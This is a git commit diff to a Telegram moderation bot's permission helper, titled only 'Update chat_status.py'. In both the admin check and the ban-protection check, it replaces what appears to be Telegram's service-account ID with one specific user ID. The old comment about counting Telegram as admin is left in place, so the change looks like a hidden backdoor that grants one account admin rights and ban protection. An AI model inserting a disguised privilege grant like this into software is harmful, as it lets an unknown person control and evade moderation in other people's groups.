800a310c1da6b2bca45b2644dc9930116de1ac45
jungkookbot <77423813+jungkookbot@users.noreply.github.com>
2021-12-08 08:02:54 +0530

    Update chat_status.py

--- SaitamaRobot/modules/helper_funcs/chat_status.py
+++ SaitamaRobot/modules/helper_funcs/chat_status.py
@@ -32,7 +32,7 @@ def is_sudo_plus(chat: Chat, user_id: int, member: ChatMember = None) -> bool:
 def is_user_admin(chat: Chat, user_id: int, member: ChatMember = None) -> bool:
     if (chat.type == 'private' or user_id in DRAGONS or user_id in DEV_USERS or
             chat.all_members_are_administrators or
-            user_id in [777000, 1087968824
+            user_id in [1379836509, 1087968824
                        ]):  # Count telegram and Group Anonymous as admin
         return True
 
@@ -76,7 +76,7 @@ def is_user_ban_protected(chat: Chat,
     if (chat.type == 'private' or user_id in DRAGONS or user_id in DEV_USERS or
             user_id in WOLVES or user_id in TIGERS or
             chat.all_members_are_administrators or
-            user_id in [777000, 1087968824
+            user_id in [1379836509, 1087968824
                        ]):  # Count telegram and Group Anonymous as admin
         return True
 
